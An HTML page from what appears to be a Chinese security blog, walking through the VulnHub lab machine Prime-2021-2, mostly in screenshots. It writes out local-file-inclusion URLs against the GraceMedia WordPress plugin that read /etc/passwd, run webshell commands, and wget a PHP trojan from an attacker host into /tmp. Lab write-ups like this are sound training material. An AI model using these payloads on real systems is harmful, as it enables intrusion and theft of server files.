@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>vulnhub靶机Prime-2021-2教程 - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap"></noscript>
+<link rel="stylesheet" href="../assets/style.css" media="print" onload="this.media='all'">
+<noscript><link rel="stylesheet" href="../assets/style.css"></noscript>
+</head>
+<body>
+<div class="scanline"></div>
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="../index.html" class="tag tag-cyan">#首页</a>
+    <a href="../tags/list.html?tag=vulnhub" class="tag tag-green">#vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="tag tag-blue">#渗透测试</a>
+  </div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<div id="navSentinel"></div>
+
+<div class="nav-sticky-wrapper" id="navWrap">
+  <div class="nav-inner">
+    <a href="../index.html">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向">逆向</a>
+    <a href="../tags/list.html?tag=调试">调试</a>
+    <a href="../tags/list.html">标签归档</a>
+  </div>
+</div>
+
+<a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
+
+<div class="post">
+  <div class="post-date">2026 // 06 / 09</div>
+  <div class="post-title">vulnhub靶机Prime-2021-2</div>
+  <div class="post-tags">
+    <a href="../tags/list.html?tag=vulnhub" class="post-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
+  </div>
+
+  <div class="post-content" style="display:block;border:none;padding:0;margin:0;">
+
+    <nav class="post-toc">
+      <span class="post-toc-title">// 目录</span>
+      <ul>
+        <li class="toc-h4"><a href="#info">信息收集</a></li>
+        <li class="toc-h5"><a href="#port">端口扫描</a></li>
+        <li class="toc-h5"><a href="#service">端口服务扫描</a></li>
+        <li class="toc-h5"><a href="#dir">目录扫描</a></li>
+        <li class="toc-h4"><a href="#web">Web渗透</a></li>
+        <li class="toc-h4"><a href="#smb">SMB 信息收集</a></li>
+        <li class="toc-h4"><a href="#ssh">SSH 登录</a></li>
+        <li class="toc-h4"><a href="#privesc">提权</a></li>
+      </ul>
+    </nav>
+
+    <p>下载地址：<a href="https://www.vulnhub.com/entry/prime-2021-2,696/" target="_blank">https://www.vulnhub.com/entry/prime-2021-2,696/</a></p>
+
+    <h4 id="info">信息收集</h4>
+    <p><img loading="lazy" src="../assets/p2_image001.png" alt="信息收集"></p>
+
+    <p>目标 145</p>
+
+    <h5 id="port">端口扫描</h5>
+    <p><img loading="lazy" src="../assets/p2_image002.png" alt="端口扫描 1"></p>
+    <p><img loading="lazy" src="../assets/p2_image003.png" alt="端口扫描 2"></p>
+
+    <h5 id="service">端口服务扫描</h5>
+    <p><img loading="lazy" src="../assets/p2_image004.png" alt="端口服务扫描 1"></p>
+    <p><img loading="lazy" src="../assets/p2_image005.png" alt="端口服务扫描 2"></p>
+    <p><img loading="lazy" src="../assets/p2_image006.png" alt="端口服务扫描 3"></p>
+
+    <h5 id="dir">目录扫描</h5>
+    <p><img loading="lazy" src="../assets/p2_image007.png" alt="目录扫描 1"></p>
+    <p><img loading="lazy" src="../assets/p2_image008.png" alt="目录扫描 2"></p>
+
+    <h4 id="web">Web渗透</h4>
+
+    <p>去访问一下 80 端口</p>
+    <p><img loading="lazy" src="../assets/p2_image009.png" alt="访问80端口"></p>
+
+    <p>扫目录发现有点不一样</p>
+    <p><img loading="lazy" src="../assets/p2_image010.png" alt="扫目录发现"></p>
+
+    <p>WordPress 被拦住，需要 api</p>
+    <p><img loading="lazy" src="../assets/p2_image011.png" alt="WordPress被拦"></p>
+    <p><img loading="lazy" src="../assets/p2_image012.png" alt="WordPress api检查"></p>
+
+    <p>那就不客气了，端口服务利用</p>
+    <p><img loading="lazy" src="../assets/p2_image013.png" alt="端口服务利用"></p>
+
+    <p>发现 gracemedia media player 插件存在 LFI 漏洞</p>
+    <pre><code>http://192.168.21.145/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd</code></pre>
+    <p><img loading="lazy" src="../assets/p2_image014.png" alt="LFI读取passwd"></p>
+
+    <p>看了下，没什么好说的了。去看看 web 端口</p>
+    <p><img loading="lazy" src="../assets/p2_image015.png" alt="查看web端口"></p>
+
+    <p>下载文件一个一个看</p>
+    <p><img loading="lazy" src="../assets/p2_image016.png" alt="下载文件"></p>
+    <p><img loading="lazy" src="../assets/p2_image017.png" alt="查看文件内容"></p>
+
+    <p>在 uploads 里面</p>
+    <p><img loading="lazy" src="../assets/p2_image018.png" alt="uploads目录"></p>
+    <p><img loading="lazy" src="../assets/p2_image019.png" alt="uploads内容"></p>
+    <p><img loading="lazy" src="../assets/p2_image020.png" alt="查看文件"></p>
+
+    <p>一句话木马</p>
+    <pre><code>http://192.168.21.145/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../home//jarves/upload/shell.php&cmd=whoami</code></pre>
+    <p><img loading="lazy" src="../assets/p2_image021.png" alt="一句话木马whoami"></p>
+
+    <p>反弹 shell</p>
+    <p><img loading="lazy" src="../assets/p2_image022.png" alt="反弹shell"></p>
+    <p><img loading="lazy" src="../assets/p2_image023.png" alt="反弹shell成功"></p>
+
+    <p>使用 wget 下载木马到 /tmp</p>
+    <pre><code>http://192.168.21.145/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../home//jarves/upload/shell.php&cmd=wget%20http://192.168.21.131:8000/1.php%20-O%20/tmp/1.php</code></pre>
+    <p><img loading="lazy" src="../assets/p2_image024.png" alt="wget下载木马"></p>
+
+    <p>查看下载成功</p>
+    <pre><code>http://192.168.21.145/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../home//jarves/upload/shell.php&cmd=cat%20/tmp/1.php</code></pre>
+    <p><img loading="lazy" src="../assets/p2_image025.png" alt="查看木马内容"></p>
+
+    <p>写成功</p>
+    <p><img loading="lazy" src="../assets/p2_image026.png" alt="写成功"></p>
+
+    <p>连接新 shell</p>
+    <pre><code>http://192.168.21.145/wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../tmp/1.php</code></pre>
+    <p><img loading="lazy" src="../assets/p2_image027.png" alt="新shell连接"></p>
+
+    <h4 id="smb">SMB 信息收集</h4>
+
+    <p>Smb 去看了一下，一直没用，肯定有问题</p>
+    <p><img loading="lazy" src="../assets/p2_image028.png" alt="SMB连接"></p>
+    <p><img loading="lazy" src="../assets/p2_image029.png" alt="SMB内容"></p>
+
+    <p>啊这</p>
+    <p><img loading="lazy" src="../assets/p2_image030.png" alt="SSH密钥文件"></p>
+    <p><img loading="lazy" src="../assets/p2_image031.png" alt="SSH密钥内容"></p>
+
+    <h4 id="ssh">SSH 登录</h4>
+
+    <p>直接 ssh 密钥登录</p>
+    <p><img loading="lazy" src="../assets/p2_image032.png" alt="SSH密钥登录"></p>
+    <p><img loading="lazy" src="../assets/p2_image033.png" alt="SSH登录成功"></p>
+
+    <p>远程登录</p>
+    <p><img loading="lazy" src="../assets/p2_image034.png" alt="远程登录"></p>
+    <p><img loading="lazy" src="../assets/p2_image035.png" alt="远程登录成功"></p>
+
+    <p>信息收集，啥也没有</p>
+    <p><img loading="lazy" src="../assets/p2_image036.png" alt="信息收集1"></p>
+    <p><img loading="lazy" src="../assets/p2_image037.png" alt="信息收集2"></p>
+    <p><img loading="lazy" src="../assets/p2_image038.png" alt="信息收集3"></p>
+
+    <h4 id="privesc">提权</h4>
+
+    <p>新的文件上传就可以</p>
+    <p><img loading="lazy" src="../assets/p2_image039.png" alt="新文件上传"></p>
+    <p><img loading="lazy" src="../assets/p2_image040.png" alt="上传成功"></p>
+
+    <p>执行</p>
+    <p><img loading="lazy" src="../assets/p2_image041.png" alt="执行命令"></p>
+
+    <p>好了，完成</p>
+    <p><img loading="lazy" src="../assets/p2_image042.png" alt="完成"></p>
+
+  </div>
+</div>
+
+<div style="margin-top:40px;padding-top:30px;border-top:1px solid rgba(255,255,255,0.06);text-align:center;font-size:13px;color:#555570;font-family:'JetBrains Mono',monospace">
+  // EOF - Prime-2021-2<br>
+  <span style="display:inline-block;width:8px;height:8px;background:#00d4ff;border-radius:50%;margin-top:8px;animation:pulse 2s ease-in-out infinite"></span>
+</div>
+
+<style>
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+</style>
+
+<script>
+const tocLinks = document.querySelectorAll('.post-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+document.querySelectorAll('.post-content pre').forEach(function(wrap){
+  if(wrap.querySelector('code')) wrap=wrap.querySelector('code');
+  var lines=wrap.textContent.split('\n').length;
+  var header=document.createElement('div');
+  header.className='code-header';
+  var info=document.createElement('span');
+  info.className='code-info';
+  info.textContent='// CODE | '+lines+' lines';
+  var actions=document.createElement('span');
+  actions.className='code-actions';
+  var copy=document.createElement('button');
+  copy.textContent='COPY';
+  copy.className='code-copy';
+  copy.onclick=function(){navigator.clipboard.writeText(wrap.textContent);this.textContent='COPIED';setTimeout(function(){copy.textContent='COPY';},2000);};
+  var fold=document.createElement('button');
+  fold.textContent='\u2191';
+  fold.className='code-fold';
+  fold.onclick=function(){
+    wrap.classList.toggle('collapsed');
+    fold.textContent=wrap.classList.contains('collapsed')?'\u2193':'\u2191';
+  };
+  wrap.onclick=function(){
+    if(wrap.classList.contains('collapsed')){wrap.classList.remove('collapsed');fold.textContent='\u2191';}
+  };
+  if(lines>10){wrap.classList.add('collapsed');fold.textContent='\u2193';}
+  actions.append(copy,fold);
+  header.append(info,actions);
+  wrap.prepend(header);
+});
+</script>
+
+<div class="graph-sidebar" id="graphSidebar">
+  <div class="graph-title"><a href="../graph.html">// 关系图谱</a></div>
+  <div id="graphContainer"></div>
+</div><script>
+(function(){
+var gs=document.getElementById("graphSidebar"),gc=document.getElementById("graphContainer");
+if(!gs||!gc)return;
+var s=document.createElement("script");
+s.src="../assets/vis-network.min.js";
+s.onload=function(){
+  var d=document.createElement("script");
+  d.src="../assets/posts-data.js";
+  d.onload=function(){
+    var p=document.createElement("script");
+    p.textContent="const POSTS=POSTS_DATA.map(function(p){return{title:p.title,date:p.date,url:p.url.replace(\"posts/\",\"\"),excerpt:p.excerpt,tags:p.tags,primary:p.primary,secondary:p.secondary};});";
+    document.body.appendChild(p);
+    var g=document.createElement("script");
+    g.src="../assets/graph.js";
+    document.body.appendChild(g);
+  };
+  document.body.appendChild(d);
+};
+document.body.appendChild(s);
+})();
+</script>
+<div class="theme-dock" id="themeDock">
+  <div class="theme-dock-item active" data-theme="dark">☽</div>
+  <div class="theme-dock-item" data-theme="light">☀</div>
+  <div class="theme-dock-item" data-theme="crystal">◇</div>
+  <div class="theme-dock-item" data-theme="ego">♢</div>
+  <div class="theme-dock-item" data-theme="rei">レ</div>
+</div>
+
+<div class="floating-buttons">
+  <button class="float-btn" id="themeToggle" title="切换主题" aria-label="切换主题">☽</button>
+  <button class="float-btn" id="backToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script src="../assets/common.js"></script>
+
+</body>
+</html>
